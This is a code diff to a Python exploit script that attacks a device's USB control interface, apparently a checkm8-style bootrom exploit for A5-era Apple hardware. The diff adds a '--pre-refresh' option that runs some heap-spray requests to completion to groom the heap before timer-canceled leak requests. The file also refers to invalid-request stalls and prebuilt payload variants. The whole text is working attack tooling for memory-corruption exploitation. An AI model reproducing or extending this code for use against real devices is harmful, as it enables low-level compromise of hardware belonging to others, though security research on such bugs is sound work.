@@ -574,15 +574,31 @@ def stage1(usb, serial_idx, leak_count, mode, spin_us, leak_delay_ms, debug):
     # sketch: ctrlReq(0,0,2,3, wValLo=0, wValHi=0x80, wIndexLo=0x80, wIndexHi=0)
     # = SET_FEATURE with feature 0x8000 (deliberately invalid) on 0x80.
     usb.ctrl(handle, 0x02, 3, 0x8000, 0x80, None, 10)  # stall (expected to error)
+    # --pre-refresh N: the first N requests run to plain completion.  A
+    # fully completed transfer frees its response buffer, so these walk the
+    # heap/freelist like the sketch's feng shui without deadening the serve
+    # pool; the timer-canceled leak requests that follow occupy it.
+    pre_refresh = getattr(stage1, 'pre_refresh', 0)
     success = 0
     attempts = 0
-    max_attempts = leak_count + 200
-    while success < leak_count:
+    max_attempts = pre_refresh + leak_count + 200
+    while success < pre_refresh + leak_count:
         attempts += 1
         if attempts > max_attempts:
             usb.release(handle)
-            raise SystemExit('error: only %d/%d leak requests were accepted' % (success, leak_count))
+            raise SystemExit('error: only %d/%d leak requests were accepted' % (success, pre_refresh + leak_count))
         req_debug = debug and (attempts <= 3 or attempts % 100 == 0)
+        if success < pre_refresh:
+            rc, info = usb.raw_ctrl(handle, 0x80, REQ_GET_DESCRIPTOR,
+                                    (STRING_DESCRIPTOR << 8) | serial_idx,
+                                    HABR_LANG, 0x80, b'', abandon=False,
+                                    timeout_ms=1500, name='refresh %#x' % 0x80)
+            ok = (rc == 0)
+            if req_debug:
+                debug_raw('refresh 0x80', rc, info)
+            if ok:
+                success += 1
+            continue
         if heap_feng_shui_req(usb, handle, serial_idx, 0x80, mode, spin_us, req_debug):
             success += 1
         # The Arduino prints a serial line per request; that pacing matters.
@@ -898,6 +914,7 @@ def exploit(args):
 
     no_reentry = bool(getattr(args, 'no_reentry', False))
     stage1.keep_handle = no_reentry
+    stage1.pre_refresh = int(getattr(args, 'pre_refresh', 0))
     stage2.keep_handle = no_reentry
     live = None
     if args.stage in ('all', '1'):
@@ -1126,6 +1143,11 @@ def main():
     parser.add_argument('--selftest', action='store_true', help='check payload hashes and exit')
     parser.add_argument('--payload', choices=sorted(PAYLOAD_FILES), default='classic',
                         help='prebuilt A5 payload variant (default: classic)')
+    parser.add_argument('--pre-refresh', type=lambda x: int(x, 0), default=0,
+                        help='first N spray requests run to plain completion '
+                             '(freed buffers walk the heap without deadening '
+                             'the serve pool); the leak-count requests after '
+                             'them are the true timer-canceled occupation')
     parser.add_argument('--no-reentry', action='store_true', default=False,
                         help='do not reset or re-acquire between stages: keep '
                              'talking on the live spray/armed handle (the '
